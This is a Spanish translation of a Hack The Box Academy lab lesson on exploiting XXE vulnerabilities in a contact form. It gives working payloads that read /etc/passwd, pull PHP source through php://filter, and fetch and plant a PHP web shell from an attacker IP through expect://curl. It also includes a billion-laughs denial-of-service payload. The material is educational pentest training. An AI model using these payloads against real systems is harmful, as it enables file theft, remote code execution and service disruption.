# Local File Disclosure

Cuando una aplicación web confía en los datos XML sin filtrar de la entrada del usuario, podemos hacer referencia a un documento XML DTD externo y definir nuevas entidades XML personalizadas. Supongamos que podemos definir nuevas entidades y mostrarlas en la página web. En ese caso, también deberíamos poder definir entidades externas y hacer que haga referencia a un archivo local, que, cuando se muestra, debe mostrarnos el contenido de ese archivo en el servidor de fondo.

Veamos cómo podemos identificar posibles vulnerabilidades XXE y explotarlas para leer archivos confidenciales del servidor de back-end.

---

# **Identificación**

El primer paso para identificar las posibles vulnerabilidades XXE es encontrar páginas web que acepten una entrada de usuario XML. Podemos comenzar el ejercicio al final de esta sección, que tiene un`Contact Form`:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_identify.jpg)

Si llenamos el formulario de contacto y hacemos clic en`Send Data`Luego intercepta la solicitud HTTP con BURP, obtenemos la siguiente solicitud:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_request.jpg)

Como podemos ver, el formulario parece estar enviando nuestros datos en un formato XML al servidor web, lo que hace que este sea un objetivo potencial de prueba XXE. Supongamos que la aplicación web utiliza bibliotecas XML obsoletas, y no aplica ningún filtros o desinfectación en nuestra entrada XML. En ese caso, podemos explotar este formulario XML para leer archivos locales.

Si enviamos el formulario sin ninguna modificación, recibimos el siguiente mensaje:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_response.jpg)

Vemos que el valor del`email`El elemento nos está mostrando en la página. Para imprimir el contenido de un archivo externo a la página, deberíamos`note which elements are being displayed, such that we know which elements to inject into`. En algunos casos, no se pueden mostrar elementos, que cubriremos cómo explotar en las próximas secciones.

Por ahora, sabemos que cualquier valor que ponemos en el`<email></email>`El elemento se muestra en la respuesta HTTP. Entonces, intentemos definir una nueva entidad y luego usársela como una variable en el`email`Elemento para ver si se reemplaza con el valor que definimos. Para hacerlo, podemos usar lo que aprendimos en la sección anterior para definir nuevas entidades XML y agregar las siguientes líneas después de la primera línea en la entrada XML:

Código:xml

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>

```

**Nota:**En nuestro ejemplo, la entrada XML en la solicitud HTTP no se declaraba DTD dentro de los datos XML en sí, o se hace referencia externamente, por lo que agregamos un nuevo DTD antes de definir nuestra entidad. Si el`DOCTYPE`ya fue declarado en la solicitud XML, solo agregaríamos el`ENTITY`elemento para él.

Ahora, deberíamos tener una nueva entidad XML llamada`company`, que podemos hacer referencia a`&company;`. Entonces, en lugar de usar nuestro correo electrónico en el`email`elemento, intentemos usar`&company;`, y vea si será reemplazado por el valor que definimos (`Inlane Freight`):

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_new_entity.jpg)

Como podemos ver, la respuesta utilizó el valor de la entidad que definimos (`Inlane Freight`) en lugar de mostrar`&company;`, indicando que podemos inyectar código XML. En contraste, se mostraría una aplicación web no vulnerable (`&company;`) como un valor en bruto.`This confirms that we are dealing with a web application vulnerable to XXE`.

**Nota:**Algunas aplicaciones web pueden predeterminar un formato JSON en solicitud HTTP, pero aún pueden aceptar otros formatos, incluido XML. Entonces, incluso si una aplicación web envía solicitudes en formato JSON, podemos intentar cambiar el`Content-Type`encabezado`application/xml`, y luego convierta los datos de JSON a XML con un[herramienta en línea](https://www.convertjson.com/json-to-xml.htm). Si la aplicación web acepta la solicitud con datos XML, entonces también podemos probarla contra las vulnerabilidades XXE, lo que puede revelar una vulnerabilidad XXE imprevista.

---

# **Lectura de archivos sensibles**

Ahora que podemos definir nuevas entidades XML internas, veamos si podemos definir entidades XML externas. Hacerlo es bastante similar a lo que hicimos antes, pero solo agregaremos el`SYSTEM`palabra clave y defina la ruta de referencia externa después de ella, como hemos aprendido en la sección anterior:

Código:xml

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>

```

Enviemos ahora la solicitud modificada y vemos si el valor de nuestra entidad XML externa se establece en el archivo que hacemos referencia:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_external_entity.jpg)

Vemos que realmente obtuvimos el contenido de la`/etc/passwd`archivo,`meaning that we have successfully exploited the XXE vulnerability to read local files`. Esto nos permite leer el contenido de archivos confidenciales, como archivos de configuración que pueden contener contraseñas u otros archivos confidenciales como un`id_rsa`Clave SSH de un usuario específico, que puede otorgarnos acceso al servidor de back-end. Podemos referirnos al[INCLUSIÓN DE ARCHIVO / DIRECTORIO Traversal](https://academy.hackthebox.com/course/preview/file-inclusion)Módulo para ver qué ataques se pueden llevar a cabo a través de la divulgación de archivos locales.

**Consejo:**En ciertas aplicaciones web de Java, también podemos especificar un directorio en lugar de un archivo, y obtendremos un listado de directorio, que puede ser útil para localizar archivos confidenciales.

---

# **Lectura del código fuente**

Otro beneficio de la divulgación de archivos locales es la capacidad de obtener el código fuente de la aplicación web. Esto nos permitiría realizar un`Whitebox Penetration Test`Para revelar más vulnerabilidades en la aplicación web, o al menos revelar configuraciones secretas como contraseñas de bases de datos o claves API.

Entonces, veamos si podemos usar el mismo ataque para leer el código fuente del`index.php`Archivo, como sigue:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_file_php.jpg)

Como podemos ver, esto no funcionó, ya que no obtuvimos ningún contenido. Esto sucedió porque`the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity`. Si un archivo contiene algunos de los caracteres especiales de XML (por ejemplo,`<`/`>`/`&`), rompería la referencia de entidad externa y no se utilizaría para la referencia. Además, no podemos leer ningún datos binarios, ya que tampoco se ajustaría al formato XML.

Afortunadamente, PHP proporciona filtros de envoltorio que nos permiten BASE64 codificar ciertos recursos 'incluidos los archivos', en cuyo caso la salida final de Base64 no debe romper el formato XML. Para hacerlo, en lugar de usar`file://`Como referencia, usaremos Php's`php://filter/`envoltura. Con este filtro, podemos especificar el`convert.base64-encode`codificador como nuestro filtro, y luego agregue un recurso de entrada (por ejemplo,`resource=index.php`), como sigue:

Código:xml

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>

```

Con eso, podemos enviar nuestra solicitud, y obtendremos la cadena codificada Base64 del`index.php`archivo:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_filter.jpg)

Podemos seleccionar la cadena Base64, haga clic en la pestaña Inspector de BURP (en el panel derecho), y nos mostrará el archivo decodificado. Para obtener más información sobre los filtros PHP, puede consultar el[INCLUSIÓN DE ARCHIVO / DIRECTORIO Traversal](https://academy.hackthebox.com/module/details/23)módulo.

`This trick only works with PHP web applications.`La siguiente sección discutirá un método más avanzado para leer el código fuente, que debería funcionar con cualquier marco web.

---

# **Ejecución de código remoto con xxe**

Además de leer archivos locales, es posible que podamos obtener la ejecución del código a través del servidor remoto. El método más fácil sería buscar`ssh`claves o intentar utilizar un truco de robo de hash en aplicaciones web basadas en Windows, haciendo una llamada a nuestro servidor. Si estos no funcionan, es posible que aún podamos ejecutar comandos en aplicaciones web basadas en PHP a través del`PHP://expect`Filtrar, aunque esto requiere el PHP`expect`módulo a instalar y habilitar.

Si el XXE imprime directamente su salida 'como se muestra en esta sección', entonces podemos ejecutar comandos básicos como`expect://id`, y la página debe imprimir la salida del comando. Sin embargo, si no tuviéramos acceso a la salida, o necesitamos ejecutar un comando más complicado 'por ejemplo, el shell inverso', entonces la sintaxis XML puede romperse y el comando no puede ejecutarse.

El método más eficiente para convertir XXE en RCE es obtener un shell web de nuestro servidor y escribirlo en la aplicación web, y luego podemos interactuar con él para ejecutar comandos. Para hacerlo, podemos comenzar escribiendo un shell web básico de PHP e iniciando un servidor web de Python, de la siguiente manera:

Divulgación de archivos locales

```
xnoxos@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.phpxnoxos@htb[/htb]$ sudo python3 -m http.server 80
```

Ahora, podemos usar el siguiente código XML para ejecutar un`curl`Comando que descarga nuestro shell web en el servidor remoto:

Código:xml

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root><name></name><tel></tel><email>&company;</email><message></message></root>
```

**Nota:**Reemplazamos todos los espacios en el código XML anterior con`$IFS`, para evitar romper la sintaxis XML. Además, muchos otros personajes como`|`, `>`, y`{`Puede romper el código, por lo que debemos evitar usarlos.

Una vez que enviamos la solicitud, debemos recibir una solicitud en nuestra máquina para el`shell.php`Archivo, después de lo cual podemos interactuar con el shell web en el servidor remoto para la ejecución del código.

**Nota:**El módulo esperado no está habilitado/instalado de forma predeterminada en los servidores PHP modernos, por lo que este ataque no siempre funciona. Esta es la razón por la cual XXE generalmente se usa para revelar archivos locales confidenciales y código fuente, lo que puede revelar vulnerabilidades o formas adicionales de obtener la ejecución del código.

# **Otros ataques xxe**

Otro ataque común a menudo realizado a través de XXE vulnerabilidades es la explotación SSRF, que se utiliza para enumerar los puertos abiertos localmente y acceder a sus páginas, entre otras páginas web restringidas, a través de la vulnerabilidad XXE. El[Ataques del lado del servidor](https://academy.hackthebox.com/course/preview/server-side-attacks)El módulo cubre completamente SSRF, y las mismas técnicas se pueden transportar con ataques XXE.

Finalmente, un uso común de los ataques XXE está causando una denegación de servicio (DOS) al servidor web de alojamiento, con el uso de la siguiente carga útil:

Código:xml

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
]>
<root><name></name><tel></tel><email>&a10;</email><message></message></root>
```

Esta carga útil define la`a0`entidad como`DOS`, lo hace referencia en`a1`varias veces, referencias`a1`en`a2`, y así sucesivamente hasta que la memoria del servidor de back-end se agote debido a los bucles de autorreferencia. Sin embargo,`this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference`. Pruébelo contra este ejercicio y vea si funciona.